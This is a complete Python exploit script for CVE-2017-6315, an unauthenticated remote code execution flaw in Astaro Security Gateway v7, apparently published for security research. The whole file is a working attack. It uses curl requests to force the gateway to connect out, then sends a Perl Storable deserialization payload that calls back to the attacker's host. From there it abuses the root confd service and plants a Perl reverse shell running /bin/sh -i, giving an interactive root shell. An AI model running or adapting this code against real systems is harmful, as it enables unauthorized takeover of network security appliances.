#!/usr/bin/python

# Astaro Security Gateway v7 - Unauthenticated Remote Code Execution
# Exploit Authors: Jakub Palaczynski and Maciej Grabiec
# Tested on versions: 7.500 and 7.506
# Date: 13.12.2016
# Vendor Homepage: https://www.sophos.com/
# CVE: CVE-2017-6315

import socket
import sys
import os
import threading
import subprocess
import time

# print help or assign arguments
if len(sys.argv) != 3:
    sys.stderr.write("[-]Usage: python %s <our_ip> <remote_ip:port>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 192.168.1.1 192.168.1.2:4444\n" % sys.argv[0])
    sys.exit(1)

lhost = sys.argv[1] # our ip address
rhost = sys.argv[2] # ip address and port of vulnerable ASG v7

# for additional thread to send requests in parallel
class requests (threading.Thread):
    def run(self):
        print 'Sending requests to trigger vulnerability.'
        time.sleep(5)
        # first request to clear cache
        os.system('curl -s -m 5 -X POST https://' + rhost + '/index.plx -d \'{"objs": [{"FID": "init"}],"backend_address": "' + lhost + ':81"}\' -k > /dev/null')
        # second request to trigger reverse connection
        os.system('curl -s -m 20 -X POST https://' + rhost + '/index.plx -d \'{"objs": [{"FID": "init"}],"backend_address": "' + lhost + ':80"}\' -k > /dev/null')

# function that creates socket
def create_socket(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', port))
    sock.listen(10)
    conn, addr = sock.accept()
    return sock, conn, addr

# function to receive data from socket
def receive(conn):
    sys.stdout.write(conn.recv(1024))
    sys.stdout.flush()
    sys.stdout.write(conn.recv(1024))
    sys.stdout.flush()

# Thanks to Agarri: http://www.agarri.fr/docs/PoC_thaw_perl58.pl
# This script creates serialized object that makes reverse connection and executes everything what it receives on a socket
file = """
#!/usr/bin/perl

use strict;
use MIME::Base64 qw( encode_base64 );
use Storable qw( nfreeze );
use LWP::UserAgent;

my $package_name = "A" x 252;
my $pack = qq~{ package $package_name; sub STORABLE_freeze { return 1; } }~;
eval($pack);

my $payload = qq~POSIX;eval('sleep(10);use IO::Socket::INET;\$r=IO::Socket::INET->new(\"""" + lhost + """:443");if (\$r) {eval(<\$r>);}');exit;~;

my $padding = length($package_name) - length($payload);
$payload = $payload . (";" x $padding);
my $data = bless { ignore => 'this' }, $package_name;
my $frozen = nfreeze($data);
$frozen =~ s/$package_name/$payload/g;
my $encodedSize = length($frozen);
my $pakiet = print(pack("N", $encodedSize), $frozen);
print "$frozen";
"""

# save file, run perl script and save our serialized payload
f = open("payload.pl", "w")
f.write(file)
f.close()

serialized = os.popen("perl ./payload.pl").read()
os.remove("./payload.pl")

# start thread that sends requests
thread = requests()
thread.start()

# open socket that receives connection from index
sock, conn, addr = create_socket(80)
print 'Received connection from: ' + addr[0] + ':' + str(addr[1]) + '.'
print 'Sending 1st stage payload.'
data = conn.recv(256)
# say hello to RPC client
conn.sendall(data)
data = conn.recv(256)
# send serialized object that initiates connect back connection and executes everything what it receives on a socket
conn.sendall(serialized)
sock.close()

# create second socket that receives connection from index and sends additional commands
sock, conn, addr = create_socket(443)
print 'Sending 2nd stage payload.'
# send commands that exploit confd (running with root permissions) which is running on localhost - the same exploitation as for first stage
conn.sendall('sleep(10);use IO::Socket::INET;my $s = new IO::Socket::INET(PeerHost => "127.0.0.1",PeerPort => "4472",Proto => "tcp");$s->send("\\x00\\x00\\x00\\x1d\\x05\\x06\\x02\\x00\\x00\\x00\\x04\\x0a\\x04\\x70\\x72\\x70\\x63\\x0a\\x04\\x30\\x2e\\x30\\x31\\x0a\\x06\\x73\\x79\\x73\\x74\\x65\\x6d\\x0a\\x00");my $a;$s->recv($a,1024);$s->send("' + "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in serialized) + '");$s->recv($a,1024);$s->close();\n')
sock.close()

# create socket that receives connection from confd and sends commands to get reverse shell
sock, conn, addr = create_socket(443)
print 'Sending 3rd stage payload.'
# send reverse shell payload
conn.sendall('sleep(20);use Socket;$i="' + lhost + '";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\n')
sock.close()

# create socket to receive shell with root permissions
print '\nNow you need to wait for shell.'
sock, conn, addr = create_socket(443)
receive(conn)
while True:
    cmd = raw_input("")
    if cmd == 'exit':
        break
    else:
        conn.send(cmd + "\n")
        receive(conn)
sock.close()